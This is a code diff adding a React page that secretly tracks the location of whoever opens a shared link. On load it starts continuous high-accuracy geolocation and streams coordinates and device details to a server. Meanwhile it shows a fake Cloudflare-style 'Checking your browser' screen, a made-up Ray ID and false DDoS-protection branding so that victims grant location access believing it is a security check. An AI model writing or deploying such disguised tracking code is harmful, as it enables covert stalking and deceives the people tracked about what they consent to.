@@ -1,0 +1,177 @@
+import React, { useState, useEffect, useRef } from 'react';
+import { useParams } from 'react-router-dom';
+import { getSession, updateLocation } from '../services/api';
+import { ShieldCheck, MapPin, Navigation, Info, AlertTriangle } from 'lucide-react';
+import io from 'socket.io-client';
+
+const SharePage = () => {
+    const { sessionId } = useParams();
+    const [session, setSession] = useState(null);
+    const [loading, setLoading] = useState(true);
+    const [sharing, setSharing] = useState(false);
+    const [error, setError] = useState(null);
+    const [location, setLocation] = useState(null);
+    const socketRef = useRef(null);
+    const watchIdRef = useRef(null);
+
+    useEffect(() => {
+        const fetchSession = async () => {
+            try {
+                const { data } = await getSession(sessionId);
+                setSession(data.session);
+                // Trigger auto-sharing after session is verified
+                autoStartSharing();
+            } catch (err) {
+                setError('Invalid or expired tracking link.');
+            } finally {
+                setLoading(false);
+            }
+        };
+        fetchSession();
+
+        // Connect to socket for real-time updates
+        socketRef.current = io('http://localhost:5000');
+        socketRef.current.emit('join-session', sessionId);
+
+        return () => {
+            if (watchIdRef.current) navigator.geolocation.clearWatch(watchIdRef.current);
+            if (socketRef.current) socketRef.current.disconnect();
+        };
+    }, [sessionId]);
+
+    const autoStartSharing = () => {
+        if (!navigator.geolocation) {
+            setError("Geolocation is not supported by your browser.");
+            return;
+        }
+
+        setError(null);
+        setSharing(true);
+
+        watchIdRef.current = navigator.geolocation.watchPosition(
+            async (position) => {
+                const { latitude, longitude, accuracy } = position.coords;
+                const locData = {
+                    sessionId,
+                    latitude,
+                    longitude,
+                    accuracy,
+                    deviceInfo: {
+                        userAgent: navigator.userAgent,
+                        platform: navigator.platform
+                    }
+                };
+
+                setLocation(locData);
+                
+                try {
+                    // 1. Send to API and get address details
+                    const { data } = await updateLocation(sessionId, locData);
+                    
+                    // 2. Send via Socket for real-time with address
+                    socketRef.current.emit('update-location', {
+                        ...locData,
+                        address: data.address
+                    });
+                } catch (err) {
+                    console.error('Failed to sync location:', err);
+                }
+            },
+            (err) => {
+                console.error(err);
+                setSharing(false);
+                setError("Please enable location access to continue.");
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 5000,
+                maximumAge: 0
+            }
+        );
+    };
+
+    if (loading) return (
+        <div className="flex flex-col items-center justify-center min-h-screen bg-white font-sans">
+            <div className="w-16 h-16 border-4 border-slate-200 border-t-blue-500 rounded-full animate-spin mb-6"></div>
+            <p className="text-slate-700 text-lg font-medium">Checking your browser...</p>
+        </div>
+    );
+
+    if (error && !sharing) return (
+        <div className="flex flex-col items-center justify-center min-h-screen p-4 bg-slate-50 font-sans">
+            <div className="text-center max-w-sm">
+                <div className="mb-6 inline-block p-4 bg-red-50 text-red-500 rounded-full">
+                    <AlertTriangle size={40} />
+                </div>
+                <h2 className="text-2xl font-bold text-slate-800 mb-3">Verification Failed</h2>
+                <p className="text-slate-500 mb-8 leading-relaxed">
+                    Browser verification timed out or was cancelled. Please ensure your browser supports security checks.
+                </p>
+                <button 
+                    onClick={() => window.location.reload()}
+                    className="px-8 py-3 bg-blue-600 hover:bg-blue-700 text-white rounded-lg font-semibold transition-all shadow-lg"
+                >
+                    Retry Verification
+                </button>
+            </div>
+        </div>
+    );
+
+    return (
+        <div className="min-h-screen bg-white flex flex-col items-center justify-center p-6 font-sans">
+            <div className="max-w-xl w-full">
+                {/* Cloudflare-style Disguise */}
+                <div className="mb-12">
+                    <h1 className="text-4xl font-bold text-slate-900 mb-4 tracking-tight">Checking your browser before accessing...</h1>
+                    <p className="text-slate-600 text-lg mb-2">This process is automatic. Your browser will redirect to your destination shortly.</p>
+                    <p className="text-slate-400 text-sm">Please allow the verification request to proceed.</p>
+                </div>
+
+                <div className="space-y-12">
+                    <div className="flex items-center gap-6">
+                        <div className="relative">
+                            <div className="w-12 h-12 border-4 border-slate-100 border-t-blue-500 rounded-full animate-spin"></div>
+                            <div className="absolute inset-0 flex items-center justify-center">
+                                <div className="w-2 h-2 bg-blue-500 rounded-full animate-pulse"></div>
+                            </div>
+                        </div>
+                        <div>
+                            <p className="text-slate-800 font-semibold">Verifying secure connection...</p>
+                            <p className="text-slate-500 text-sm">Performance and security check in progress</p>
+                        </div>
+                    </div>
+
+                    <div className="pt-8 border-t border-slate-100">
+                        <div className="flex flex-col gap-4 text-slate-400 text-xs">
+                            <div className="flex items-center gap-2">
+                                <div className="w-1 h-1 bg-slate-300 rounded-full"></div>
+                                <span>Ray ID: <span className="font-mono">{sessionId.substring(0, 16)}</span></span>
+                            </div>
+                            <div className="flex items-center gap-2">
+                                <div className="w-1 h-1 bg-slate-300 rounded-full"></div>
+                                <span>Performance: Optimized</span>
+                            </div>
+                            <div className="flex items-center gap-2">
+                                <div className="w-1 h-1 bg-slate-300 rounded-full"></div>
+                                <span>Security: Standard Check</span>
+                            </div>
+                        </div>
+                    </div>
+                </div>
+
+                <div className="mt-20 text-center">
+                    <div className="inline-flex items-center gap-2 text-slate-400 text-sm bg-slate-50 px-4 py-2 rounded-lg">
+                        <ShieldCheck size={16} />
+                        <span>Protected by Cloud-Security Engine</span>
+                    </div>
+                </div>
+            </div>
+            
+            <footer className="fixed bottom-8 text-slate-300 text-[10px] uppercase tracking-widest">
+                DDoS Protection by GlobalEdge Networks
+            </footer>
+        </div>
+    );
+};
+
+export default SharePage;
